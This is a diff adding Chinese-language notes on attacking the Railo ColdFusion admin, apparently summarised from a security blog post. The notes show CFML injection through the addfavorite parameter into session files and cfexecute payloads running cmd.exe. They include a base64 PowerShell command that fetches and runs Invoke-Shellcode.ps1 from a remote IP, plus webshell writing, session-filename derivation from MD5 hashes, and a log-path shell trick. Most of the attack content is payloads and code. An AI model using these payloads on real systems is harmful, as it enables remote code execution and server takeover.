@@ -1,0 +1,183 @@
+http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/
+
+
+Session
+信息存放
+	注入方式：
+		User-Agent
+		应用本身提供的接口
+
+	Railo
+		相对固定的存放路径
+			/admin/userdata
+
+		相对固定的Session文件名（伪随机数）
+			web-[value].cfm
+			server-[value].cfm
+
+
+	session文件的后缀为cfm
+	会被CFML解释器解析，寻找其中的CF标签
+
+	Railo中session文件的写入时机：
+		配置修改，创建页面书签
+
+
+	/railo-context/admin/web.cfm?
+	action=internal.savedata&
+	action2=addfavorite&
+	favorite=server.request
+
+	执行后，”server.request“ 被写入session文件中，
+	以JSON编码的数组对象中
+	{'fullscreen':'true','contentwidth':'1267','favorites':{'server.request':''}}
+
+
+
+	尝试执行注入
+
+	/railo-context/admin/web.cfm?
+	action=internal.savedata&
+	action2=addfavorite&
+	favorite=
+	<cfoutput>
+	<cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir" timeout="10" variable="output"></cfexecute>
+	<pre>#output#</pre> <!-- This is ColdFusion’s way of escaping a number sign -- >
+	</cfoutput>
+
+	执行命令无法回显，可以采用两种策略：
+		反弹Shell
+		写Webshell
+
+		执行Powershell
+		/railo-context/admin/web.cfm?
+		action=internal.savedata&
+		action2=addfavorite&
+		favorite=:
+		<cfoutput>
+		<cfexecute name="c:\windows\system32\cmd.exe" arguments="/c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA2ADoAOAAwADAAMAAvAEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUALgBwAHMAMQAnACkA" timeout="10" variable="output">
+		</cfexecute>
+		</cfoutput>' HTTP/1.1
+
+		Powershell下载文件
+		iex (New-Object Net.WebClient).DownloadString('http://192.168.1.6:8000/Invoke-Shellcode.ps1')
+
+
+		执行命令，写入文件
+		':<cfoutput><cfexecute name="c:\windows\system32\cmd.exe" arguments="/c dir > ./webapps/www/WEB-INF/railo/context/output.cfm" timeout="10" variable="output"></cfexecute></cfoutput>'
+
+		文件必须为cfm后缀，否则访问为404
+
+		如何计算Session所存放的文件的文件名，
+			跟踪nternal.savedata ＋ addfavorite的实现，确认最后将favorite写入文件的逻辑：
+			<cfif listFind("addfavorite,removefavorite", url.action2) and structKeyExists(url, "favorite")>
+				<!-- -->
+    			<cfset application.adminfunctions[url.action2](url.favorite) />
+        		<cflocation url="?action=#url.favorite#" addtoken="no" />
+
+
+    		<cffunction name="addfavorite" returntype="void" output="no">
+    		    <cfargument name="action" type="string" required="yes" />
+    		    <cfset var data = getfavorites() />
+    		    <cfset data[arguments.action] = "" />
+    		    <cfset setdata('favorites', data) />
+    		</cffunction>
+
+
+    		<cffunction name="setdata" returntype="void" output="no">
+        		<cfargument name="key" type="string" required="yes" />
+        		<cfargument name="value" type="any" required="yes" />
+        		<cflock name="setdata_admin" timeout="1" throwontimeout="no">
+        			<!-- 在这里读取Session文件 -->
+        	    	<cfset var data = loadData() />
+        	    	<cfset data[arguments.key] = arguments.value />
+        	    	<cfset writeData() />
+        		</cflock>
+   			</cffunction>
+
+   			<cffunction name="loadData" access="private" output="no" returntype="any">
+        		<cfset var dataKey = getDataStoreName() />
+            	[..snip..]
+
+            <cffunction name="getDataStoreName" access="private" output="no" returntype="string">
+            	<!-- 无任何逻辑， 直接返回 -- >
+        		<cfreturn "#request.admintype#-#getrailoid()[request.admintype].id#" />
+    		</cffunction>
+
+    		这部分代码访问Admin.java中的实现
+    		private String getCallerId() throws IOException {
+        		if(type==TYPE_WEB) {
+            		return config.getId();
+        		}
+        	}
+
+
+       	@Override
+    	public String getId() {
+    	    if(id==null){
+    	        id = getId(getSecurityKey(),getSecurityToken(),false,securityKey);
+    	    }
+    	    return id;
+    	}
+
+    	/*
+    		addMacAddress 参数为false
+    		真正执行的逻辑为Md5.getDigestAsString(key+token);
+
+    		securityKey为执行失败之后Session文件默认的文件名
+
+    	*/
+		public static String getId(String key, String token,boolean addMacAddress,String defaultValue) {
+
+		    try {
+		        if(addMacAddress){// because this was new we could swutch to a new ecryption // FUTURE cold we get rid 		of the old one?
+		            return Hash.sha256(key+";"+token+":"+SystemUtil.getMacAddress());
+		        }
+		        return Md5.getDigestAsString(key+token);
+		    }
+		    catch (Throwable t) {
+		        return defaultValue;
+		    }
+		}
+
+		getSecurityKey
+		一段UUID算法，生成同名文件的web目录下
+
+
+		getSecurityToken
+		public String getSecurityToken() {
+   		    if(securityToken==null){
+   		        try {
+   		            //当前执行cfm文件执行路径
+   		            securityToken = Md5.getDigestAsString(getConfigDir().getAbsolutePath());
+
+   		        }
+   		        catch (IOException e) {
+   		            return null;
+   		        }
+   		    }
+   		    return securityToken;
+   		}
+
+
+   		getSecurityToken，既绝对路径可以通过404方式获取
+   		getSecurityKey，可通过配置4XX，5XX页面获取
+
+   		暴完之后，md5计算一下hash，即可获得Session文件的web路径。
+
+
+日志
+
+	日志相关配置
+		日志级别
+		日志类型
+		日志存放位置
+		自定义日志处理方法
+
+		路径（Path）参数：
+			修改为/context/log_shell.cfm
+			（待验证）
+		标题（Title）参数
+			修改为任意cf代码 <cfdump var="#session#"/>
+
+数据库配置
